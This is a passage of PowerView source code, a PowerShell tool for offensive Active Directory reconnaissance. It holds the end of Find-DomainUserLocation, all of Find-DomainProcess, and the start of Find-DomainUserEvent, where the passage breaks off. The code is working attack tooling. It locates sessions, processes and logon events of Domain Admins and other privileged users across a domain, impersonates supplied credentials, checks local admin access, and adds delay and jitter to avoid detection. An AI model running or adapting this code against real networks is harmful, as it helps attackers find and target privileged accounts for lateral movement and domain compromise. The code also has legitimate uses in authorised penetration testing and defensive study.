                # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    $Sessions = Get-NetSession -ComputerName $TargetComputer
                    ForEach ($Session in $Sessions) {
                        $UserName = $Session.UserName
                        $CName = $Session.CName

                        if ($CName -and $CName.StartsWith('\\')) {
                            $CName = $CName.TrimStart('\')
                        }

                        # make sure we have a result, and ignore computer$ sessions
                        if (($UserName) -and ($UserName.Trim() -ne '') -and ($UserName -notmatch $CurrentUser) -and ($UserName -notmatch '\$$')) {

                            if ( (-not $TargetUsers) -or ($TargetUsers -contains $UserName)) {
                                $UserLocation = New-Object PSObject
                                $UserLocation | Add-Member Noteproperty 'UserDomain' $Null
                                $UserLocation | Add-Member Noteproperty 'UserName' $UserName
                                $UserLocation | Add-Member Noteproperty 'ComputerName' $TargetComputer
                                $UserLocation | Add-Member Noteproperty 'SessionFrom' $CName

                                # try to resolve the DNS hostname of $Cname
                                try {
                                    $CNameDNSName = [System.Net.Dns]::GetHostEntry($CName) | Select-Object -ExpandProperty HostName
                                    $UserLocation | Add-Member NoteProperty 'SessionFromName' $CnameDNSName
                                }
                                catch {
                                    $UserLocation | Add-Member NoteProperty 'SessionFromName' $Null
                                }

                                # see if we're checking to see if we have local admin access on this machine
                                if ($CheckAccess) {
                                    $Admin = (Test-AdminAccess -ComputerName $CName).IsAdmin
                                    $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                }
                                else {
                                    $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Null
                                }
                                $UserLocation.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                $UserLocation
                            }
                        }
                    }
                    if (-not $Stealth) {
                        # if we're not 'stealthy', enumerate loggedon users as well
                        $LoggedOn = Get-NetLoggedon -ComputerName $TargetComputer
                        ForEach ($User in $LoggedOn) {
                            $UserName = $User.UserName
                            $UserDomain = $User.LogonDomain

                            # make sure wet have a result
                            if (($UserName) -and ($UserName.trim() -ne '')) {
                                if ( (-not $TargetUsers) -or ($TargetUsers -contains $UserName) -and ($UserName -notmatch '\$$')) {
                                    $IPAddress = @(Resolve-IPAddress -ComputerName $TargetComputer)[0].IPAddress
                                    $UserLocation = New-Object PSObject
                                    $UserLocation | Add-Member Noteproperty 'UserDomain' $UserDomain
                                    $UserLocation | Add-Member Noteproperty 'UserName' $UserName
                                    $UserLocation | Add-Member Noteproperty 'ComputerName' $TargetComputer
                                    $UserLocation | Add-Member Noteproperty 'IPAddress' $IPAddress
                                    $UserLocation | Add-Member Noteproperty 'SessionFrom' $Null
                                    $UserLocation | Add-Member Noteproperty 'SessionFromName' $Null

                                    # see if we're checking to see if we have local admin access on this machine
                                    if ($CheckAccess) {
                                        $Admin = Test-AdminAccess -ComputerName $TargetComputer
                                        $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                    }
                                    else {
                                        $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Null
                                    }
                                    $UserLocation.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                    $UserLocation
                                }
                            }
                        }
                    }
                }
            }

            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        # only ignore threading if -Delay is passed
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-DomainUserLocation] Total number of hosts: $($TargetComputers.count)"
            Write-Verbose "[Find-DomainUserLocation] Delay: $Delay, Jitter: $Jitter"
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-DomainUserLocation] Enumerating server $Computer ($Counter of $($TargetComputers.Count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $TargetUsers, $CurrentUser, $Stealth, $LogonToken

                if ($Result -and $StopOnSuccess) {
                    Write-Verbose "[Find-DomainUserLocation] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[Find-DomainUserLocation] Using threading with threads: $Threads"
            Write-Verbose "[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length)"

            # if we're using threading, kick off the script block with New-ThreadedFunction
            $ScriptParams = @{
                'TargetUsers' = $TargetUsers
                'CurrentUser' = $CurrentUser
                'Stealth' = $Stealth
                'TokenHandle' = $LogonToken
            }

            # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Find-DomainProcess {
<#
.SYNOPSIS

Searches for processes on the domain using WMI, returning processes
that match a particular user specification or process name.

Thanks to @paulbrandau for the approach idea.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer, Get-DomainUser, Get-DomainGroupMember, Get-WMIProcess, New-ThreadedFunction  

.DESCRIPTION

This function enumerates all machines on the current (or specified) domain
using Get-DomainComputer, and queries the domain for users of a specified group
(default 'Domain Admins') with Get-DomainGroupMember. Then for each server the
function enumerates any current processes running with Get-WMIProcess,
searching for processes running under any target user contexts or with the
specified -ProcessName. If -Credential is passed, it is passed through to
the underlying WMI commands used to enumerate the remote machines.

.PARAMETER ComputerName

Specifies an array of one or more hosts to enumerate, passable on the pipeline.
If -ComputerName is not passed, the default behavior is to enumerate all machines
in the domain returned by Get-DomainComputer.

.PARAMETER Domain

Specifies the domain to query for computers AND users, defaults to the current domain.

.PARAMETER ComputerDomain

Specifies the domain to query for computers, defaults to the current domain.

.PARAMETER ComputerLDAPFilter

Specifies an LDAP query string that is used to search for computer objects.

.PARAMETER ComputerSearchBase

Specifies the LDAP source to search through for computers,
e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful for OU queries.

.PARAMETER ComputerUnconstrained

Switch. Search computer objects that have unconstrained delegation.

.PARAMETER ComputerOperatingSystem

Search computers with a specific operating system, wildcards accepted.

.PARAMETER ComputerServicePack

Search computers with a specific service pack, wildcards accepted.

.PARAMETER ComputerSiteName

Search computers in the specific AD Site name, wildcards accepted.

.PARAMETER ProcessName

Search for processes with one or more specific names.

.PARAMETER UserIdentity

Specifies one or more user identities to search for.

.PARAMETER UserDomain

Specifies the domain to query for users to search for, defaults to the current domain.

.PARAMETER UserLDAPFilter

Specifies an LDAP query string that is used to search for target users.

.PARAMETER UserSearchBase

Specifies the LDAP source to search through for target users.
e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful for OU queries.

.PARAMETER UserGroupIdentity

Specifies a group identity to query for target users, defaults to 'Domain Admins.
If any other user specifications are set, then UserGroupIdentity is ignored.

.PARAMETER UserAdminCount

Switch. Search for users users with '(adminCount=1)' (meaning are/were privileged).

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain and target systems.

.PARAMETER StopOnSuccess

Switch. Stop hunting after finding after finding a target user.

.PARAMETER Delay

Specifies the delay (in seconds) between enumerating hosts, defaults to 0.

.PARAMETER Jitter

Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3

.PARAMETER Threads

The number of threads to use for user searching, defaults to 20.

.EXAMPLE

Find-DomainProcess

Searches for processes run by 'Domain Admins' by enumerating every computer in the domain.

.EXAMPLE

Find-DomainProcess -UserAdminCount -ComputerOperatingSystem 'Windows 7*' -Domain dev.testlab.local

Enumerates Windows 7 computers in dev.testlab.local and returns any processes being run by
privileged users in dev.testlab.local.

.EXAMPLE

Find-DomainProcess -ProcessName putty.exe

Searchings for instances of putty.exe running on the current domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Find-DomainProcess -Domain testlab.local -Credential $Cred

Searches processes being run by 'domain admins' in the testlab.local using the specified alternate credentials.

.OUTPUTS

PowerView.UserProcess
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [Alias('Unconstrained')]
        [Switch]
        $ComputerUnconstrained,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,

        [Parameter(ParameterSetName = 'TargetProcess')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ProcessName,

        [Parameter(ParameterSetName = 'TargetUser')]
        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $UserGroupIdentity = 'Domain Admins',

        [Parameter(ParameterSetName = 'TargetUser')]
        [Alias('AdminCount')]
        [Switch]
        $UserAdminCount,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $StopOnSuccess,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $ComputerSearcherArguments = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['Domain']) { $ComputerSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }

        $UserSearcherArguments = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $UserSearcherArguments['Identity'] = $UserIdentity }
        if ($PSBoundParameters['Domain']) { $UserSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['UserDomain']) { $UserSearcherArguments['Domain'] = $UserDomain }
        if ($PSBoundParameters['UserLDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $UserLDAPFilter }
        if ($PSBoundParameters['UserSearchBase']) { $UserSearcherArguments['SearchBase'] = $UserSearchBase }
        if ($PSBoundParameters['UserAdminCount']) { $UserSearcherArguments['AdminCount'] = $UserAdminCount }
        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }


        # first, build the set of computers to enumerate
        if ($PSBoundParameters['ComputerName']) {
            $TargetComputers = $ComputerName
        }
        else {
            Write-Verbose '[Find-DomainProcess] Querying computers in the domain'
            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainProcess] TargetComputers length: $($TargetComputers.Length)"
        if ($TargetComputers.Length -eq 0) {
            throw '[Find-DomainProcess] No hosts found to enumerate'
        }

        # now build the user target set
        if ($PSBoundParameters['ProcessName']) {
            $TargetProcessName = @()
            ForEach ($T in $ProcessName) {
                $TargetProcessName += $T.Split(',')
            }
            if ($TargetProcessName -isnot [System.Array]) {
                $TargetProcessName = [String[]] @($TargetProcessName)
            }
        }
        elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
            $TargetUsers = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $GroupSearcherArguments = @{
                'Identity' = $UserGroupIdentity
                'Recurse' = $True
            }
            if ($PSBoundParameters['UserDomain']) { $GroupSearcherArguments['Domain'] = $UserDomain }
            if ($PSBoundParameters['UserSearchBase']) { $GroupSearcherArguments['SearchBase'] = $UserSearchBase }
            if ($PSBoundParameters['Server']) { $GroupSearcherArguments['Server'] = $Server }
            if ($PSBoundParameters['SearchScope']) { $GroupSearcherArguments['SearchScope'] = $SearchScope }
            if ($PSBoundParameters['ResultPageSize']) { $GroupSearcherArguments['ResultPageSize'] = $ResultPageSize }
            if ($PSBoundParameters['ServerTimeLimit']) { $GroupSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
            if ($PSBoundParameters['Tombstone']) { $GroupSearcherArguments['Tombstone'] = $Tombstone }
            if ($PSBoundParameters['Credential']) { $GroupSearcherArguments['Credential'] = $Credential }
            $GroupSearcherArguments
            $TargetUsers = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }

        # the host enumeration block we're using to enumerate all servers
        $HostEnumBlock = {
            Param($ComputerName, $ProcessName, $TargetUsers, $Credential)

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    # try to enumerate all active processes on the remote host
                    # and search for a specific process name
                    if ($Credential) {
                        $Processes = Get-WMIProcess -Credential $Credential -ComputerName $TargetComputer -ErrorAction SilentlyContinue
                    }
                    else {
                        $Processes = Get-WMIProcess -ComputerName $TargetComputer -ErrorAction SilentlyContinue
                    }
                    ForEach ($Process in $Processes) {
                        # if we're hunting for a process name or comma-separated names
                        if ($ProcessName) {
                            if ($ProcessName -Contains $Process.ProcessName) {
                                $Process
                            }
                        }
                        # if the session user is in the target list, display some output
                        elseif ($TargetUsers -Contains $Process.User) {
                            $Process
                        }
                    }
                }
            }
        }
    }

    PROCESS {
        # only ignore threading if -Delay is passed
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-DomainProcess] Total number of hosts: $($TargetComputers.count)"
            Write-Verbose "[Find-DomainProcess] Delay: $Delay, Jitter: $Jitter"
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-DomainProcess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                $Result = Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $TargetProcessName, $TargetUsers, $Credential
                $Result

                if ($Result -and $StopOnSuccess) {
                    Write-Verbose "[Find-DomainProcess] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[Find-DomainProcess] Using threading with threads: $Threads"

            # if we're using threading, kick off the script block with New-ThreadedFunction
            $ScriptParams = @{
                'ProcessName' = $TargetProcessName
                'TargetUsers' = $TargetUsers
                'Credential' = $Credential
            }

            # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }
}


function Find-DomainUserEvent {
<#
.SYNOPSIS

Finds logon events on the current (or remote domain) for the specified users.

Author: Lee Christensen (@tifkin_), Justin Warner (@sixdub), Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainUser, Get-DomainGroupMember, Get-DomainController, Get-DomainUserEvent, New-ThreadedFunction  

.DESCRIPTION

Enumerates all domain controllers from the specified -Domain
(default of the local domain) using Get-DomainController, enumerates
the logon events for each using Get-DomainUserEvent, and filters
the results based on the targeting criteria.

.PARAMETER ComputerName

Specifies an explicit computer name to retrieve events from.

.PARAMETER Domain

Specifies a domain to query for domain controllers to enumerate.
Defaults to the current domain.

.PARAMETER Filter

A hashtable of PowerView.LogonEvent properties to filter for.
The 'op|operator|operation' clause can have '&', '|', 'and', or 'or',
and is 'or' by default, meaning at least one clause matches instead of all.
See the exaples for usage.

.PARAMETER StartTime

The [DateTime] object representing the start of when to collect events.
Default of [DateTime]::Now.AddDays(-1).

.PARAMETER EndTime

The [DateTime] object representing the end of when to collect events.
Default of [DateTime]::Now.

.PARAMETER MaxEvents

The maximum number of events (per host) to retrieve. Default of 5000.

.PARAMETER UserIdentity

Specifies one or more user identities to search for.

.PARAMETER UserDomain

Specifies the domain to query for users to search for, defaults to the current domain.

.PARAMETER UserLDAPFilter

Specifies an LDAP query string that is used to search for target users.

.PARAMETER UserSearchBase

Specifies the LDAP source to search through for target users.
e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful for OU queries.

.PARAMETER UserGroupIdentity

Specifies a group identity to query for target users, defaults to 'Domain Admins.
If any other user specifications are set, then UserGroupIdentity is ignored.

.PARAMETER UserAdminCount

Switch. Search for users users with '(adminCount=1)' (meaning are/were privileged).

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target computer(s).

.PARAMETER StopOnSuccess

Switch. Stop hunting after finding after finding a target user.

.PARAMETER Delay

Specifies the delay (in seconds) between enumerating hosts, defaults to 0.

.PARAMETER Jitter

Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3

.PARAMETER Threads

The number of threads to use for user searching, defaults to 20.

.EXAMPLE

Find-DomainUserEvent

Search for any user events matching domain admins on every DC in the current domain.

.EXAMPLE

$cred = Get-Credential dev\administrator
Find-DomainUserEvent -ComputerName 'secondary.dev.testlab.local' -UserIdentity 'john'

Search for any user events matching the user 'john' on the 'secondary.dev.testlab.local'
domain controller using the alternate credential

.EXAMPLE

'primary.testlab.local | Find-DomainUserEvent -Filter @{'IpAddress'='192.168.52.200|192.168.52.201'}

Find user events on the primary.testlab.local system where the event matches
the IPAddress '192.168.52.200' or '192.168.52.201'.

.EXAMPLE

$cred = Get-Credential testlab\administrator
Find-DomainUserEvent -Delay 1 -Filter @{'LogonGuid'='b8458aa9-b36e-eaa1-96e0-4551000fdb19'; 'TargetLogonId' = '10238128'; 'op'='&'}

Find user events mathing the specified GUID AND the specified TargetLogonId, searching
through every domain controller in the current domain, enumerating each DC in serial
instead of in a threaded manner, using the alternate credential.

.OUTPUTS

PowerView.LogonEvent

PowerView.ExplicitCredentialLogon

.LINK

http://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogon')]
    [CmdletBinding(DefaultParameterSetName = 'Domain')]
    Param(
        [Parameter(ParameterSetName = 'ComputerName', Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName,

        [Parameter(ParameterSetName = 'Domain')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $Filter,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $StartTime = [DateTime]::Now.AddDays(-1),

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $EndTime = [DateTime]::Now,

        [ValidateRange(1, 1000000)]
        [Int]
        $MaxEvents = 5000,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $UserGroupIdentity = 'Domain Admins',

        [Alias('AdminCount')]
        [Switch]
        $UserAdminCount,

        [Switch]
        $CheckAccess,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $StopOnSuccess,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $UserSearcherArguments = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $UserSearcherArguments['Identity'] = $UserIdentity }
        if ($PSBoundParameters['UserDomain']) { $UserSearcherArguments['Domain'] = $UserDomain }
        if ($PSBoundParameters['UserLDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $UserLDAPFilter }
        if ($PSBoundParameters['UserSearchBase']) { $UserSearcherArguments['SearchBase'] = $UserSearchBase }
        if ($PSBoundParameters['UserAdminCount']) { $UserSearcherArguments['AdminCount'] = $UserAdminCount }
        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount']) {
            $TargetUsers = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        elseif ($PSBoundParameters['UserGroupIdentity'] -or (-not $PSBoundParameters['Filter'])) {
            # otherwise we're querying a specific group
            $GroupSearcherArguments = @{
                'Identity' = $UserGroupIdentity
                'Recurse' = $True
            }
            Write-Verbose "UserGroupIdentity: $UserGroupIdentity"
            if ($PSBoundParameters['UserDomain']) { $GroupSearcherArguments['Domain'] = $UserDomain }
            if ($PSBoundParameters['UserSearchBase']) { $GroupSearcherArguments['SearchBase'] = $UserSearchBase }
            if ($PSBoundParameters['Server']) { $GroupSearcherArguments['Server'] = $Server }
            if ($PSBoundParameters['SearchScope']) { $GroupSearcherArguments['SearchScope'] = $SearchScope }
            if ($PSBoundParameters['ResultPageSize']) { $GroupSearcherArguments['ResultPageSize'] = $ResultPageSize }
            if ($PSBoundParameters['ServerTimeLimit']) { $GroupSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
            if ($PSBoundParameters['Tombstone']) { $GroupSearcherArguments['Tombstone'] = $Tombstone }
            if ($PSBoundParameters['Credential']) { $GroupSearcherArguments['Credential'] = $Credential }
            $TargetUsers = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }

        # build the set of computers to enumerate
        if ($PSBoundParameters['ComputerName']) {
            $TargetComputers = $ComputerName
        }
        else {
            # if not -ComputerName is passed, query the current (or target) domain for domain controllers
            $DCSearcherArguments = @{
                'LDAP' = $True
            }
            if ($PSBoundParameters['Domain']) { $DCSearcherArguments['Domain'] = $Domain }
            if ($PSBoundParameters['Server']) { $DCSearcherArguments['Server'] = $Server }
            if ($PSBoundParameters['Credential']) { $DCSearcherArguments['Credential'] = $Credential }
            Write-Verbose "[Find-DomainUserEvent] Querying for domain controllers in domain: $Domain"
            $TargetComputers = Get-DomainController @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        if ($TargetComputers -and ($TargetComputers -isnot [System.Array])) {
            $TargetComputers = @(,$TargetComputers)
        }
        Write-Verbose "[Find-DomainUserEvent] TargetComputers length: $($TargetComputers.Length)"
        Write-Verbose "[Find-DomainUserEvent] TargetComputers $TargetComputers"
        if ($TargetComputers.Length -eq 0) {
            throw '[Find-DomainUserEvent] No hosts found to enumerate'
        }

        # the host enumeration block we're using to enumerate all servers
        $HostEnumBlock = {
            Param($ComputerName, $StartTime, $EndTime, $MaxEvents, $TargetUsers, $Filter, $Credential)

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    $DomainUserEventArgs = @{
                        'ComputerName' = $TargetComputer
                    }
                    if ($StartTime) { $DomainUserEventArgs['StartTime'] = $StartTime }
                    if ($EndTime) { $DomainUserEventArgs['EndTime'] = $EndTime }
                    if ($MaxEvents) { $DomainUserEventArgs['MaxEvents'] = $MaxEvents }
                    if ($Credential) { $DomainUserEventArgs['Credential'] = $Credential }
                    if ($Filter -or $TargetUsers) {
                        if ($TargetUsers) {
